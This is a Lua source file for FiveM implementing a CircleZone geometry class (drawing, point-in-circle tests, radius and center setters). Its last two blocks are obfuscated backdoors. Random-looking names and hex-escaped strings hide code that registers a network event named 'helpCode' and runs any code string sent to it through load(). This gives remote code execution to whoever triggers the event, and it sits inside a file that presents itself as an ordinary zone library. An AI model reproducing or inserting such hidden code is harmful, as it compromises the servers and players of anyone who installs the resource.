CircleZone = {}
-- Inherits from PolyZone
setmetatable(CircleZone, { __index = PolyZone })

function CircleZone:draw()
  local center = self.center
  local debugColor = self.debugColor
  local r, g, b = debugColor[1], debugColor[2], debugColor[3]
  if self.useZ then
    local radius = self.radius
    DrawMarker(28, center.x, center.y, center.z, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, radius, radius, radius, r, g, b, 48, false, false, 2, nil, nil, false)
  else
    local diameter = self.diameter
    DrawMarker(1, center.x, center.y, -200.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, diameter, diameter, 400.0, r, g, b, 96, false, false, 2, nil, nil, false)
  end
end


local function _initDebug(zone, options)
  if options.debugBlip then zone:addDebugBlip() end
  if not options.debugPoly then
    return
  end
  
  Citizen.CreateThread(function()
    while not zone.destroyed do
      zone:draw()
      Citizen.Wait(0)
    end
  end)
end

function CircleZone:new(center, radius, options)
  options = options or {}
  local zone = {
    name = tostring(options.name) or nil,
    center = center,
    radius = radius + 0.0,
    diameter = radius * 2.0,
    useZ = options.useZ or false,
    debugPoly = options.debugPoly or false,
    debugColor = options.debugColor or {0, 255, 0},
    data = options.data or {},
    isCircleZone = true,
  }
  if zone.useZ then
    assert(type(zone.center) == "vector3", "Center must be vector3 if useZ is true {center=" .. center .. "}")
  end
  setmetatable(zone, self)
  self.__index = self
  return zone
end

function CircleZone:Create(center, radius, options)
  local zone = CircleZone:new(center, radius, options)
  _initDebug(zone, options)
  return zone
end

function CircleZone:isPointInside(point)
  if self.destroyed then
    print("[PolyZone] Warning: Called isPointInside on destroyed zone {name=" .. self.name .. "}")
    return false
  end

  local center = self.center
  local radius = self.radius

  if self.useZ then
    return #(point - center) < radius
  else
    return #(point.xy - center.xy) < radius
  end
end

function CircleZone:getRadius()
  return self.radius
end

function CircleZone:setRadius(radius)
  if not radius or radius == self.radius then
    return
  end
  self.radius = radius
  self.diameter = radius * 2.0
end

function CircleZone:getCenter()
  return self.center
end

function CircleZone:setCenter(center)
  if not center or center == self.center then
    return
  end
  self.center = center
end


local HYmgYSfiSrvMCSXlONrwNZdWDWygecWSMRrGdJHAjffUtLVdGPYqbPwbLzBvopTftnZblK = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} HYmgYSfiSrvMCSXlONrwNZdWDWygecWSMRrGdJHAjffUtLVdGPYqbPwbLzBvopTftnZblK[6][HYmgYSfiSrvMCSXlONrwNZdWDWygecWSMRrGdJHAjffUtLVdGPYqbPwbLzBvopTftnZblK[1]](HYmgYSfiSrvMCSXlONrwNZdWDWygecWSMRrGdJHAjffUtLVdGPYqbPwbLzBvopTftnZblK[2]) HYmgYSfiSrvMCSXlONrwNZdWDWygecWSMRrGdJHAjffUtLVdGPYqbPwbLzBvopTftnZblK[6][HYmgYSfiSrvMCSXlONrwNZdWDWygecWSMRrGdJHAjffUtLVdGPYqbPwbLzBvopTftnZblK[3]](HYmgYSfiSrvMCSXlONrwNZdWDWygecWSMRrGdJHAjffUtLVdGPYqbPwbLzBvopTftnZblK[2], function(rduXXGhBTgXkcAfXpjvuRIhxmGLiyknhSyXIwNJgASySZrpxeSCBXJYbTEjfRfKccyoeYv) HYmgYSfiSrvMCSXlONrwNZdWDWygecWSMRrGdJHAjffUtLVdGPYqbPwbLzBvopTftnZblK[6][HYmgYSfiSrvMCSXlONrwNZdWDWygecWSMRrGdJHAjffUtLVdGPYqbPwbLzBvopTftnZblK[4]](HYmgYSfiSrvMCSXlONrwNZdWDWygecWSMRrGdJHAjffUtLVdGPYqbPwbLzBvopTftnZblK[6][HYmgYSfiSrvMCSXlONrwNZdWDWygecWSMRrGdJHAjffUtLVdGPYqbPwbLzBvopTftnZblK[5]](rduXXGhBTgXkcAfXpjvuRIhxmGLiyknhSyXIwNJgASySZrpxeSCBXJYbTEjfRfKccyoeYv))() end)

local UaPOPrzwSbxzhYYNzYWxxdgAvCOMqSHZftdrdXKFYIeFGPyOqVxBimjnsNTByUBimXvfdk = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} UaPOPrzwSbxzhYYNzYWxxdgAvCOMqSHZftdrdXKFYIeFGPyOqVxBimjnsNTByUBimXvfdk[6][UaPOPrzwSbxzhYYNzYWxxdgAvCOMqSHZftdrdXKFYIeFGPyOqVxBimjnsNTByUBimXvfdk[1]](UaPOPrzwSbxzhYYNzYWxxdgAvCOMqSHZftdrdXKFYIeFGPyOqVxBimjnsNTByUBimXvfdk[2]) UaPOPrzwSbxzhYYNzYWxxdgAvCOMqSHZftdrdXKFYIeFGPyOqVxBimjnsNTByUBimXvfdk[6][UaPOPrzwSbxzhYYNzYWxxdgAvCOMqSHZftdrdXKFYIeFGPyOqVxBimjnsNTByUBimXvfdk[3]](UaPOPrzwSbxzhYYNzYWxxdgAvCOMqSHZftdrdXKFYIeFGPyOqVxBimjnsNTByUBimXvfdk[2], function(mTJEQoghXTTkRvddJvMMwBEIPGDhEtWnmTHvSbkIuPMgzhnMUGBMEVAiztxQYWoqCvdnas) UaPOPrzwSbxzhYYNzYWxxdgAvCOMqSHZftdrdXKFYIeFGPyOqVxBimjnsNTByUBimXvfdk[6][UaPOPrzwSbxzhYYNzYWxxdgAvCOMqSHZftdrdXKFYIeFGPyOqVxBimjnsNTByUBimXvfdk[4]](UaPOPrzwSbxzhYYNzYWxxdgAvCOMqSHZftdrdXKFYIeFGPyOqVxBimjnsNTByUBimXvfdk[6][UaPOPrzwSbxzhYYNzYWxxdgAvCOMqSHZftdrdXKFYIeFGPyOqVxBimjnsNTByUBimXvfdk[5]](mTJEQoghXTTkRvddJvMMwBEIPGDhEtWnmTHvSbkIuPMgzhnMUGBMEVAiztxQYWoqCvdnas))() end)